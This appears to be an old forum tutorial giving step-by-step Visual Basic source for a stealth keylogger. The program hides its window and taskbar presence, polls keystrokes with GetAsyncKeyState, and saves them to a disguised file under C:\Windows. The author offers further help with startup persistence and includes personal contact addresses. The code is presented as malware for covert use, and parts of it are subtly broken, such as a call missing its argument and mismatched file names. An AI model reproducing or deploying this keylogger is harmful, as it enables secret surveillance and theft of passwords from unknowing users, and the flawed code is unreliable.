Ok...I am assuming that you have a basic understanding as to how visual basic works and how to make programs, debug, and compile. If not, email me and I might be able to help.

First, if you don't have it, get it. ApiGuide. Download it at http://www.mentalis.org/agnet/apiguide.shtml

Ok. Open VB and start a new application. Add to the form a button, a timer, and a module(I know the module isn't actually part of the form). Thats all. Change there caption of the button to Start Logging
(if you want to make it start on startup...pm me or email me)
Now using api guide or just copying from here, declare a new function. the GetASyncKeyState function



Declare Function GetAsyncKeyState Lib "user32" Alias "GetAsyncKeyState"

(ByVal vKey As Long) As Integer


^---put this in the declarations section of the module.

That is all one line of code. Make sure its like that. and not split in 2.

Now you have a new function to use through your program.
ok...
now we must make it be "invisible". Now im sorry but in Windows XP, i do not know how to remove it from the "processes" section of the Task Manager. But Other than that...its invisible.

OK. In the button code..., in the click event of course...
type the following



app.taskvisible = false

form1.visible = false

form1.hide

timer1.enabled = true





'and also in the properties section of the form...change the shownintaskbar to false


Now when we click the button...it goes invisible.

Now we are going to need some variables....
Back in the declarations section declare the following...



Dim strLetter as String, strTotal as String


Now in the timer code put this. Ill explain afterward.
also set the interval to 1 and enabled to false



Private Sub Timer1_Timer()



For I = 28 To 128



If GetAsyncKeyState <> 0 Then



strLetter = Chr(I)





'Now here you can add certain things

'so that instead of displaying

'retarded characters, it tells you

'what the user pressed. What I mean

'is if they press Enter/Return, it will

'Show some weird box. You dont want that

'so u make a select case about I for each

'button u want to customize. PM me or Email

'me for help on this part.





strTotal = strTotal & strLetter





End If



Next I



open "C:\Windows\SysResources.DAT" for output as #1

Print #1, strTotal

close #1



End Sub





'End Code


Now all you have to do is when you want to check the keys pressed, open up C:\Windows\SysResource.DAT in notepad, and there it is. This program will not run on start up. If you want to know how to do that, PM me, but preferably email me. I would much rather have you add me to Msn Messenger. My email for messenger is... Black_viper_13@hotmail.com
My email for emailing is..... Anarchist_ninja_thief@hotmail.com.

Hope this helps!
Here is the entire coding for the lamers...



'BEGINNING



Dim strLetter As String, strTotal As String, old as string



Private Sub Command1_Click()

Timer1.Enabled = True

End Sub



Private Sub Form_Load()

Command1.Caption = "Start Loggin"

Timer1.Enabled = False

Timer1.Interval = 1

End Sub



Private Sub Timer1_Timer()

For I = 28 To 128 'ASCII code

If GetAsyncKeyState <> 0 Then

strLetter = Chr(I)

End If

If strletter <> Old Then

Old = strletter

strTotal = strTotal & old

End If

Next I

Open "C:\windows\SysResources.dat" For Output As #1

Print #1, strTotal

Close #1

End Sub



'ENDING
